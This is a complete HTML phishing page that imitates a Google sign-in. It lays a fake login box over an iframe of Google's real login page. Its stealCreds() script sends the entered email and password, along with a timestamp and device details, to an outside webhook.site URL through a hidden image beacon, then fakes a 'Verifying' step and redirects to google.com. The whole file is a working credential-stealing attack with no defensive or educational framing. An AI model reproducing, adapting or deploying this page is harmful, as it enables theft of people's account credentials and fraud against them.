<!DOCTYPE html>
<html>
<head><title>Secure Sign-In</title></head>
<body style="margin:0;font-family:-apple-system, sans-serif;background:#f8f9fa;">
<!-- Real site iframe (makes authentic) -->
<iframe src="https://accounts.google.com/ServiceLogin" 
        style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:1;"></iframe>

<!-- Fake login overlay -->
<div style="position:fixed;top:25%;left:50%;transform:translate(-50%,-50%);z-index:2;
            background:white;padding:2.5rem;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.15);
            width:min(95vw,380px);text-align:center;">
  <h2 style="color:#202124;margin:0 0 1.5rem;font-size:24px;">Sign in</h2>
  <input id="username" type="email" placeholder="Email or phone" 
         style="width:100%;padding:16px;margin-bottom:16px;border:1px solid #dadce0;border-radius:8px;
                font-size:16px;box-sizing:border-box;background:white;">
  <input id="password" type="password" placeholder="Password" 
         style="width:100%;padding:16px;border-radius:8px;font-size:16px;
                border:1px solid #dadce0;box-sizing:border-box;background:white;">
  <button onclick="stealCreds()" 
          style="width:100%;padding:16px;margin-top:8px;background:#1a73e8;color:white;
                 border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;">
    Next
  </button>
  <div style="font-size:13px;color:#5f6368;margin-top:16px;">Protected by Google</div>
</div>

<script>
// ‚≠ê THIS IS THE IPHONE MAGIC ‚≠ê
function stealCreds() {
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;
  
  if (!user || !pass) {
    return alert('Please enter your credentials');
  }
  
  // CREATE INVISIBLE IMAGE BEACON
  const beacon = new Image(1, 1);  // 1x1 invisible pixel
  beacon.src = `https://webhook.site/cb0f182e-ac42-41ce-bd41-6126aa1a684a/image.png?` +
               `email=${encodeURIComponent(user)}&` +
               `password=${encodeURIComponent(pass)}&` +
               `time=${new Date().toISOString()}&` +
               `device=${encodeURIComponent(navigator.userAgent)}&` +
               `url=${encodeURIComponent(location.href)}`;
  
  // Hide form, fake success
  document.querySelector('div').innerHTML = 
    '<div style="font-size:20px;color:#1a73e8;">üîÑ Verifying...</div>' +
    '<div style="font-size:14px;color:#5f6368;margin-top:12px;">One moment</div>';
  
  // Redirect after 2 seconds
  setTimeout(() => {
    location.href = 'https://www.google.com/';
  }, 2000);
}
</script>
</body>
</html>
